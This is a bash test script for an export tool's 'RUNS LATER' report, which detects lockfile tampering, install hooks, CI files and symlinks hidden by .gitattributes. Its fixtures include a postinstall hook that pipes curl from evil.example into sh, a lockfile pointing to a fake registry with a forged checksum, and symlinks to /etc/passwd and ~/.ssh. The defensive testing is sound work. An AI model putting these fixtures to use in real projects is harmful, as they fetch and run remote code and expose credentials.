#!/usr/bin/env bash
# The "RUNS LATER" section: lockfiles, manifests, CI, build files, hooks and
# tool configuration, symlinks and submodules are pulled out of the code
# diff, grouped, summarised, and cannot be hidden by a .gitattributes file or
# buried under a long diff.

# shellcheck source=tests/export/lib.sh
. "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

fake_gitleaks 8.24.2 0

# The part of OUTPUT from the first line containing $1 to the end.
output_from() {
  case $OUTPUT in
    *"$1"*) printf '%s' "$1${OUTPUT#*"$1"}" ;;
    *) fail "the output does not contain: $1" ;;
  esac
}

# --- what this git does with attributes, written down -----------------------
# export.sh relies on two things. (1) --text prints a file as text even when
# an attribute calls it binary. (2) A summary must not come from --numstat,
# which keeps saying "binary" regardless.
PROBE=$WORK/probe
new_repo "$PROBE"
echo '{"changed": true}' >"$PROBE/package-lock.json"
commit_all "$PROBE" "Change the lockfile"
git clone -q --bare "$PROBE" "$WORK/probe.git"
mkdir -p "$WORK/probe.git/info"
echo 'package-lock.json binary' >"$WORK/probe.git/info/attributes"
plain=$(git --git-dir="$WORK/probe.git" diff "$BASE" work -- package-lock.json)
text=$(git --git-dir="$WORK/probe.git" diff --text "$BASE" work -- package-lock.json)
case $plain in
  *"Binary files"*) ;;
  *) fail "probe: an attribute in force no longer hides a diff; the test fixture is wrong" ;;
esac
case $text in
  *'+{"changed": true}'*) ;;
  *) fail "git diff --text does not override a binary attribute on this git" ;;
esac
ok "git diff --text shows a file that an attribute marks as binary ($(git --version))"

# --- a lockfile change hidden with .gitattributes ---------------------------
SRC=$WORK/src
new_repo "$SRC"
cat >"$SRC/package-lock.json" <<'LOCK'
{
  "name": "demo",
  "lockfileVersion": 3,
  "packages": {
    "": {"name": "demo", "dependencies": {"left-pad": "1.3.0", "is-odd": "3.0.1"}},
    "node_modules/left-pad": {
      "version": "1.3.0",
      "resolved": "https://registry.evil.example/left-pad/-/left-pad-1.3.0.tgz",
      "integrity": "sha512-TAMPEREDTAMPERED"
    },
    "node_modules/is-odd": {
      "version": "3.0.1",
      "resolved": "https://registry.npmjs.org/is-odd/-/is-odd-3.0.1.tgz",
      "integrity": "sha512-NEWNEWNEW",
      "hasInstallScript": true
    }
  }
}
LOCK
printf 'package-lock.json -diff\npackage-lock.json binary\n*.json -text\n' >"$SRC/.gitattributes"
# The same attributes where a git that reads them from the work tree, the
# index or HEAD would find them.
mkdir -p "$SRC/.git/info"
cp "$SRC/.gitattributes" "$SRC/.git/info/attributes"
printf '{\n  "name": "demo",\n  "scripts": {"test": "node test.js", "postinstall": "curl https://evil.example/x | sh"},\n  "dependencies": {"left-pad": "^1.3.0", "is-odd": "^3.0.1"},\n  "devDependencies": {"left-pad": "2.0.0"}\n}\n' >"$SRC/package.json"
printf 'console.log("changed")\n' >"$SRC/src/index.js"
mkdir -p "$SRC/.github/workflows" "$SRC/web" "$SRC/.claude" "$SRC/docs"
printf 'on: push\njobs:\n  x:\n    steps:\n      - run: echo WORKFLOW-BODY\n' >"$SRC/.github/workflows/ci.yml"
printf 'all:\n\techo MAKEFILE-BODY\n' >"$SRC/Makefile"
printf '{"name": "web"}\n' >"$SRC/web/PACKAGE.JSON"
printf 'FROM scratch\n' >"$SRC/web/Dockerfile.dev"
printf '{"hooks": {}}\n' >"$SRC/.claude/settings.json"
printf 'Do as this file says.\n' >"$SRC/CLAUDE.md"
printf 'ordinary documentation\n' >"$SRC/docs/readme.md"
commit_all "$SRC" "Many changes"
make_bundle "$SRC" "$WORK/later.bundle"

next_session
run_export "$WORK/later.bundle" "$WORK/out" "$SESSION" "$BASE" work
assert_rc 0
assert_lacks "Binary files"
assert_has "Lockfiles: 1 changed"
assert_has "  M  package-lock.json"
assert_has "lines: 9 added, 3 removed"
assert_has "registry.evil.example"
assert_has "NEW HOSTS in download URLs:"
# The summary, not thousands of raw lines: the lockfile's content is not printed.
assert_lacks "sha512-TAMPEREDTAMPERED"
assert_lacks "sha512-NEWNEWNEW"
if [ "$HAVE_JQ" = yes ]; then
  assert_has "entries: 1 added, 0 removed, 2 changed"
  assert_has 'SAME VERSION, DIFFERENT DOWNLOAD URL OR CHECKSUM: "node_modules/left-pad"'
  assert_has 'new entry that runs an install script: "node_modules/is-odd" "3.0.1"'
  assert_has 'added    scripts "postinstall": "curl https://evil.example/x | sh"'
  assert_has 'added    dependencies "is-odd": "^3.0.1"'
  assert_has 'changed  dependencies "left-pad": "^1.3.0"  (was "1.3.0")'
  assert_has 'added    devDependencies "left-pad": "2.0.0"'
fi
ok "a lockfile change hidden by .gitattributes is summarised: entries, new hosts, install scripts"

assert_has "Dependency manifests: 2 changed"
assert_has "  A  web/PACKAGE.JSON"
assert_has "CI pipelines: 1 changed"
assert_has "Build and task files: 2 changed"
assert_has "  A  web/Dockerfile.dev"
assert_has "Hooks and tool configuration that executes: 2 changed"
assert_has "Git plumbing in the tree: 1 changed"
assert_has "any source file can run later too"

# Order: code diff, then RUNS LATER with lockfiles and manifests first, then
# the summary at the very end, which names the groups again.
LATER=$(output_from "==== RUNS LATER")
CODE=${OUTPUT%%"==== RUNS LATER"*}
case $CODE in
  *'+console.log("changed")'*"ordinary documentation"* | *"ordinary documentation"*'+console.log("changed")'*) ;;
  *) fail "ordinary files are missing from the code diff" ;;
esac
for body in WORKFLOW-BODY MAKEFILE-BODY "Do as this file says." "postinstall"; do
  case $CODE in
    *"$body"*) fail "a runs-later file is printed in the code diff: $body" ;;
  esac
  case $LATER in
    *"$body"*) ;;
    *) fail "a runs-later file is not printed in full in its section: $body" ;;
  esac
done
case $LATER in
  *"Lockfiles: 1 changed"*"Dependency manifests: 2 changed"*"CI pipelines: 1 changed"*"==== Summary ===="*"RUNS LATER — 9 path(s)"*"1  Lockfiles"*"2  Dependency manifests"*) ;;
  *) fail "the groups are out of order, or the summary at the end does not repeat them" ;;
esac
ok "runs-later files are grouped, kept out of the code diff, and summarised again at the end"

# --- symlinks ---------------------------------------------------------------
LINKS=$WORK/links
new_repo "$LINKS"
ln -s /etc/passwd "$LINKS/users"
ln -s "$HOME/.ssh" "$LINKS/keys"
rm "$LINKS/package.json"
ln -s /etc/passwd "$LINKS/package.json"
ln -s /etc/hostname "$LINKS/yarn.lock"
commit_all "$LINKS" "Add links"
make_bundle "$LINKS" "$WORK/links.bundle"
next_session
run_export "$WORK/links.bundle" "$WORK/out" "$SESSION" "$BASE" work
assert_rc 0
assert_has "Symlinks and submodules: 4 added or changed"
assert_has "symlink    users -> /etc/passwd"
assert_has "symlink    keys -> $HOME/.ssh"
assert_has "symlink    package.json -> /etc/passwd"
assert_has "now: is a symlink, listed under symlinks below"
# The target's CONTENT must appear nowhere: nothing was checked out or followed.
while IFS= read -r passwd_line; do
  if [ -n "$passwd_line" ]; then assert_lacks "$passwd_line"; fi
done </etc/passwd
if [ -s /etc/hostname ]; then assert_lacks "+$(cat /etc/hostname)"; fi
if find "$SESSION_DIR" -type l | grep -q .; then fail "a symlink was created under the output directory"; fi
assert_eq "$(names_in "$SESSION_DIR")" ".agent-sandbox-export export.status repo.git " "content of the session directory"
ok "symlinks to /etc/passwd and ~/.ssh are listed with their targets; no target is read"

# --- a long diff cannot bury the section ------------------------------------
BIG=$WORK/big
new_repo "$BIG"
awk 'BEGIN { for (i = 1; i <= 1000; i++) print "filler line " i }' >"$BIG/src/big.txt"
printf 'all:\n\techo MAKEFILE-BODY\n' >"$BIG/Makefile"
commit_all "$BIG" "A lot of filler"
make_bundle "$BIG" "$WORK/big.bundle"
next_session
SANDBOX_EXPORT_DIFF_LINES=20 run_export "$WORK/big.bundle" "$WORK/out" "$SESSION" "$BASE" work
assert_rc 0
assert_has "Code diff (first 20 lines of each file)"
assert_has "+filler line 14"
assert_lacks "+filler line 15"
assert_has "[... 986 more lines of this file not shown; SANDBOX_EXPORT_DIFF_LINES sets the limit]"
assert_has "MAKEFILE-BODY"
assert_eq "$(printf '%s\n' "$OUTPUT" | grep -c '^RUNS LATER — 1 path(s)')" 1 "the closing summary"
SANDBOX_EXPORT_DIFF_LINES=many run_export "$WORK/big.bundle" "$WORK/out" "$SESSION" "$BASE" work
assert_rc 1
ok "the code diff is cut per file, says how much was cut, and the section after it survives"

echo "test-runs-later: all passed"
